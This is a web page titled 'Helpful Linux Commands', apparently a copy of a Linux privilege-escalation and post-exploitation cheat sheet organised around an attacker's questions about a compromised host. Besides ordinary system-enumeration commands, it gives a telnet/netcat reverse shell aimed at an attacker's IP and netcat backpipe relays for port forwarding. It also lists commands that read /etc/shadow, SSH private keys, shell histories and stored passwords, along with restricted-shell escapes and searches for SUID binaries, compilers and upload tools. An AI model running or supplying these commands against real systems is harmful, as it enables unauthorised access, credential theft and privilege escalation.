---
layout: page
title: Linux Commands
---
# Helpful Linux Commands

<p>Operating System<br />
What&#8217;s the distribution type? What version?<br />
cat /etc/issue<br />
cat /etc/*-release<br />
cat /etc/lsb-release<br />
cat /etc/redhat-release</p>
<p>What&#8217;s the Kernel version? Is it 64-bit?<br />
cat /proc/version<br />
uname -a<br />
uname -mrs<br />
rpm -q kernel<br />
dmesg | grep Linux<br />
ls /boot | grep vmlinuz-</p>
<p>What can be learnt from the environmental variables?<br />
cat /etc/profile<br />
cat /etc/bashrc<br />
cat ~/.bash_profile<br />
cat ~/.bashrc<br />
cat ~/.bash_logout<br />
env<br />
set</p>
<p>Is there a printer?<br />
lpstat -a</p>
<p>Applications &amp; Services<br />
What services are running? Which service has which user privilege?<br />
ps aux<br />
ps -ef<br />
top<br />
cat /etc/service</p>
<p>Which service(s) are been running by root? Of these services, which are vulnerable &#8211; it&#8217;s worth a double check!<br />
ps aux | grep root<br />
ps -ef | grep root</p>
<p>What applications are installed? What version are they? Are they currently running?<br />
ls -alh /usr/bin/<br />
ls -alh /sbin/<br />
dpkg -l<br />
rpm -qa<br />
ls -alh /var/cache/apt/archivesO<br />
ls -alh /var/cache/yum/</p>
<p>Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?<br />
cat /etc/syslog.conf<br />
cat /etc/chttp.conf<br />
cat /etc/lighttpd.conf<br />
cat /etc/cups/cupsd.conf<br />
cat /etc/inetd.conf<br />
cat /etc/apache2/apache2.conf<br />
cat /etc/my.conf<br />
cat /etc/httpd/conf/httpd.conf<br />
cat /opt/lampp/etc/httpd.conf<br />
ls -aRl /etc/ | awk &#8216;$1 ~ /^.*r.*/</p>
<p>What jobs are scheduled?<br />
crontab -l<br />
ls -alh /var/spool/cron<br />
ls -al /etc/ | grep cron<br />
ls -al /etc/cron*<br />
cat /etc/cron*<br />
cat /etc/at.allow<br />
cat /etc/at.deny<br />
cat /etc/cron.allow<br />
cat /etc/cron.deny<br />
cat /etc/crontab<br />
cat /etc/anacrontab<br />
cat /var/spool/cron/crontabs/root</p>
<p>Any plain text usernames and/or passwords?<br />
grep -i user [filename]<br />
grep -i pass [filename]<br />
grep -C 5 &#8220;password&#8221; [filename]<br />
find . -name &#8220;*.php&#8221; -print0 | xargs -0 grep -i -n &#8220;var $password&#8221; # Joomla</p>
<p>Communications &amp; Networking<br />
What NIC(s) does the system have? Is it connected to another network?<br />
/sbin/ifconfig -a<br />
cat /etc/network/interfaces<br />
cat /etc/sysconfig/network</p>
<p>What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?<br />
cat /etc/resolv.conf<br />
cat /etc/sysconfig/network<br />
cat /etc/networks<br />
iptables -L<br />
hostname<br />
dnsdomainname</p>
<p>What other users &amp; hosts are communicating with the system?<br />
lsof -i<br />
lsof -i :80<br />
grep 80 /etc/services<br />
netstat -antup<br />
netstat -antpx<br />
netstat -tulpn<br />
chkconfig &#8211;list<br />
chkconfig &#8211;list | grep 3:on<br />
last<br />
w</p>
<p>Whats cached? IP and/or MAC addresses<br />
arp -e<br />
route<br />
/sbin/route -nee</p>
<p>Is packet sniffing possible? What can be seen? Listen to live traffic<br />
# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]<br />
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21</p>
<p>Have you got a shell? Can you interact with the system?<br />
# <a href="http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/" rel="nofollow">http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a><br />
nc -lvp 4444 # Attacker. Input (Commands)<br />
nc -lvp 4445 # Attacker. Ouput (Results)<br />
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # On the targets system. Use the attackers IP!</p>
<p>Is port forwarding possible? Redirect and interact with traffic from another view<br />
# rinetd<br />
# <a href="http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch" rel="nofollow">http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch</a></p>
<p># fpipe<br />
# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]<br />
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7</p>
<p># ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]<br />
ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port<br />
ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port</p>
<p># mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe<br />
mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe # Port Relay<br />
mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080)<br />
mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)</p>
<p>Is tunnelling possible? Send commands locally, remotely<br />
ssh -D 127.0.0.1:9050 -N [username]@[ip]<br />
proxychains ifconfig</p>
<p>Confidential Information &amp; Users<br />
Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?<br />
id<br />
who<br />
w<br />
last<br />
cat /etc/passwd | cut -d: # List of users<br />
grep -v -E &#8220;^#&#8221; /etc/passwd | awk -F: &#8216;$3 == 0 { print $1}&#8217; # List of super users<br />
awk -F: &#8216;($3 == &#8220;0&#8221;) {print}&#8217; /etc/passwd # List of super users<br />
cat /etc/sudoers<br />
sudo -l</p>
<p>What sensitive files can be found?<br />
cat /etc/passwd<br />
cat /etc/group<br />
cat /etc/shadow<br />
ls -alh /var/mail/</p>
<p>Anything &#8220;interesting&#8221; in the home directorie(s)? If it&#8217;s possible to access<br />
ls -ahlR /root/<br />
ls -ahlR /home/</p>
<p>Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords<br />
cat /var/apache2/config.inc<br />
cat /var/lib/mysql/mysql/user.MYD<br />
cat /root/anaconda-ks.cfg</p>
<p>What has the user being doing? Is there any password in plain text? What have they been edting?<br />
cat ~/.bash_history<br />
cat ~/.nano_history<br />
cat ~/.atftp_history<br />
cat ~/.mysql_history<br />
cat ~/.php_history</p>
<p>What user information can be found?<br />
cat ~/.bashrc<br />
cat ~/.profile<br />
cat /var/mail/root<br />
cat /var/spool/mail/root</p>
<p>Can private-key information be found?<br />
cat ~/.ssh/authorized_keys<br />
cat ~/.ssh/identity.pub<br />
cat ~/.ssh/identity<br />
cat ~/.ssh/id_rsa.pub<br />
cat ~/.ssh/id_rsa<br />
cat ~/.ssh/id_dsa.pub<br />
cat ~/.ssh/id_dsa<br />
cat /etc/ssh/ssh_config<br />
cat /etc/ssh/sshd_config<br />
cat /etc/ssh/ssh_host_dsa_key.pub<br />
cat /etc/ssh/ssh_host_dsa_key<br />
cat /etc/ssh/ssh_host_rsa_key.pub<br />
cat /etc/ssh/ssh_host_rsa_key<br />
cat /etc/ssh/ssh_host_key.pub<br />
cat /etc/ssh/ssh_host_key</p>
<p>File Systems<br />
Which configuration files can be written in /etc/? Able to reconfigure a service?<br />
ls -aRl /etc/ | awk &#8216;$1 ~ /^.*w.*/&#8217; 2&gt;/dev/null # Anyone<br />
ls -aRl /etc/ | awk &#8216;$1 ~ /^..w/&#8217; 2&gt;/dev/null # Owner<br />
ls -aRl /etc/ | awk &#8216;$1 ~ /^&#8230;..w/&#8217; 2&gt;/dev/null # Group<br />
ls -aRl /etc/ | awk &#8216;$1 ~ /w.$/&#8217; 2&gt;/dev/null # Other</p>
<p>find /etc/ -readable -type f 2&gt;/dev/null # Anyone<br />
find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone</p>
<p>What can be found in /var/ ?<br />
ls -alh /var/log<br />
ls -alh /var/mail<br />
ls -alh /var/spool<br />
ls -alh /var/spool/lpd<br />
ls -alh /var/lib/pgsql<br />
ls -alh /var/lib/mysql<br />
cat /var/lib/dhcp3/dhclient.leases</p>
<p>Any settings/files (hidden) on website? Any settings file with database information?<br />
ls -alhR /var/www/<br />
ls -alhR /srv/www/htdocs/<br />
ls -alhR /usr/local/www/apache22/data/<br />
ls -alhR /opt/lampp/htdocs/<br />
ls -alhR /var/www/html/</p>
<p>Is there anything in the log file(s) (Could help with &#8220;Local File Includes&#8221;!)<br />
# <a href="http://www.thegeekstuff.com/2011/08/linux-var-log-files/" rel="nofollow">http://www.thegeekstuff.com/2011/08/linux-var-log-files/</a><br />
cat /etc/httpd/logs/access_log<br />
cat /etc/httpd/logs/access.log<br />
cat /etc/httpd/logs/error_log<br />
cat /etc/httpd/logs/error.log<br />
cat /var/log/apache2/access_log<br />
cat /var/log/apache2/access.log<br />
cat /var/log/apache2/error_log<br />
cat /var/log/apache2/error.log<br />
cat /var/log/apache/access_log<br />
cat /var/log/apache/access.log<br />
cat /var/log/auth.log<br />
cat /var/log/chttp.log<br />
cat /var/log/cups/error_log<br />
cat /var/log/dpkg.log<br />
cat /var/log/faillog<br />
cat /var/log/httpd/access_log<br />
cat /var/log/httpd/access.log<br />
cat /var/log/httpd/error_log<br />
cat /var/log/httpd/error.log<br />
cat /var/log/lastlog<br />
cat /var/log/lighttpd/access.log<br />
cat /var/log/lighttpd/error.log<br />
cat /var/log/lighttpd/lighttpd.access.log<br />
cat /var/log/lighttpd/lighttpd.error.log<br />
cat /var/log/messages<br />
cat /var/log/secure<br />
cat /var/log/syslog<br />
cat /var/log/wtmp<br />
cat /var/log/xferlog<br />
cat /var/log/yum.log<br />
cat /var/run/utmp<br />
cat /var/webmin/miniserv.log<br />
cat /var/www/logs/access_log<br />
cat /var/www/logs/access.log<br />
ls -alh /var/lib/dhcp3/<br />
ls -alh /var/log/postgresql/<br />
ls -alh /var/log/proftpd/<br />
ls -alh /var/log/samba/<br />
# auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</p>
<p>If commands are limited, you break out of the &#8220;jail&#8221; shell?<br />
python -c &#8216;import pty;pty.spawn(&#8220;/bin/bash&#8221;)&#8217;<br />
echo os.system(&#8216;/bin/bash&#8217;)<br />
/bin/sh -i</p>
<p>How are file-systems mounted?<br />
mount<br />
df -h</p>
<p>Are there any unmounted file-systems?<br />
cat /etc/fstab</p>
<p>What &#8220;Advanced Linux File Permissions&#8221; are used? Sticky bits, SUID &amp; GUID<br />
find / -perm -1000 -type d 2&gt;/dev/null # Sticky bit &#8211; Only the owner of the directory or the owner of a file can delete or rename here<br />
find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) &#8211; run as the group, not the user who started it.<br />
find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) &#8211; run as the owner, not the user who started it.</p>
<p>find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID<br />
for i in `locate -r &#8220;bin$&#8221;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done # Looks in &#8216;common&#8217; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</p>
<p># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)<br />
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</p>
<p>Where can written to and executed from? A few &#8216;common&#8217; places: /tmp, /var/tmp, /dev/shm<br />
find / -writable -type d 2&gt;/dev/null # world-writeable folders<br />
find / -perm -222 -type d 2&gt;/dev/null # world-writeable folders<br />
find / -perm -o+w -type d 2&gt;/dev/null # world-writeable folders</p>
<p>find / -perm -o+x -type d 2&gt;/dev/null # world-executable folders</p>
<p>find / \( -perm -o+w -perm -o+x \) -type d 2&gt;/dev/null # world-writeable &amp; executable folders</p>
<p>Any &#8220;problem&#8221; files? Word-writeable, &#8220;nobody&#8221; files<br />
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print # world-writeable files<br />
find /dir -xdev \( -nouser -o -nogroup \) -print # Noowner files</p>
<p>Preparation &amp; Finding Exploit Code<br />
What development tools/languages are installed/supported?<br />
find / -name perl*<br />
find / -name python*<br />
find / -name gcc*<br />
find / -name cc</p>
<p>How can files be uploaded?<br />
find / -name wget<br />
find / -name nc*<br />
find / -name netcat*<br />
find / -name tftp*<br />
find / -name ftp</p>
